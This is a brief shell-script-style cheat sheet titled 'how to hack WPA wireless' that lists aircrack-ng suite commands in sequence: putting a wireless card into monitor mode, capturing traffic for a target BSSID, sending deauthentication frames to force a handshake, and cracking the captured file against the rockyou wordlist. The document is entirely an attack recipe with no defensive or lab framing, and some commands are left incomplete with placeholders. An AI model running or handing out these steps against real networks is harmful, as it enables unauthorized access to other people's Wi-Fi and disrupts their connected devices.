#!/usr/bin/bash 
# how to hack WPA wireless
How to crack WPA wireless

	airmon-ng start wlan0

	airodump-ng mon0

	airodump-ng -c 6  -w Adam --bssid ? mon0

	aireplay-ng -0 0 -a <bssid> 

	aircrack-ng -a 2 Adam-01.cap -w rockyou.txt